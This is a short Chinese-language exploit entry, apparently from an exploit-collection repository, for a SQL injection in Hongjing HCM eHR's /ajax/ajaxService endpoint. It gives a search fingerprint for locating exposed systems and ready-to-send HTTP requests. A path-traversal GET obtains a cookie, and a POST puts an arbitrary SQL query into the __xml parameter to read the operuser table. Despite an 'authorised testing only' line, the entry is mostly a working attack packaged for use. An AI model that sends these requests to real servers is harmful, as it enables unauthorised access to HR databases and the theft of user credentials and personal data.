---
source: "R4gd0ll/I-Wanna-Get-All"
---

# 宏景HCM ajaxService SQL注入漏洞

## 漏洞描述

宏景HCM `/ajax/ajaxService` 接口 `__xml` 参数存在 SQL 注入漏洞（UNION 联合注入）。利用前需先请求登录页获取有效 Cookie，再 POST 注入。

## 影响版本

```
宏景HCM eHR
```

## 网络测绘

```
app="HJSOFT-HCM"
```

## 漏洞复现

```
GET /templates/attestation/%2e%2e/%2e%2e/templates/index/getpassword.jsp HTTP/1.1
# 获取有效 Cookie（失败则提示 cookie获取失败）

POST /ajax/ajaxService HTTP/1.1
Cookie: <上一步获取的 Cookie>
Content-Type: application/x-www-form-urlencoded

__type=extTrans&__xml={"functionId":"151211001137","sql":"select a0100,1 a0101,1 b0110,1 e0122,1 e01a1,1 dbase,1 a0000 from operuser","nbase":"1"}
```

`__xml` 中 `sql` 字段直接拼接执行，示例查询 `operuser` 表用户字段；UNION 构造的查询结果回显在响应中。

> 仅限授权测试。PoC 逻辑提取自 I-Wanna-Get-All 集成利用工具对应模块。
